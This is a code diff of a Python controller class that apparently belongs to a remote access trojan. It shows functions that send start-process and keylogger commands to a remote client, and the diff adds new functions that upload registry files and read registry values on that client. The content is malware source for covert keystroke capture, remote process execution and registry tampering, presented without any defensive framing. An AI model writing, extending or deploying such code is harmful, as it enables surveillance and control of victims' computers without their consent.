@@ -64,7 +64,7 @@ class ClientServices:
         print('SEND START PROCESS SIGNAL')
 
         self.buff.send('startprocess!F!'.encode())
-        self.buff.send(str(name).encode() + self.DELIM)
+        self.buff.send(name.encode() + self.DELIM)
         return self.buff.recv_until(self.DELIM).decode()
 
     # keylogger func
@@ -77,7 +77,20 @@ class ClientServices:
     def keylogger_Send(self):
         self.keylogger_Command('send')
         return self.buff.recv_until(self.DELIM).decode()
+
+    # send Reg
+    def sendRegFile(self, data):
+        self.buff.send('regfile!F!'.encode())
+        self.buff.send(data.encode() + self.DELIM)
         
+        return self.buff.recv_until(self.DELIM).decode()
+
+    def sendRegGetVal(self, path, val):
+        self.buff.send('reggetval!F!'.encode())
+        self.buff.send(path.encode() + self.DELIM)
+        self.buff.send(val.encode() + self.DELIM)
+        
+        return self.recvDump()
     
         
 
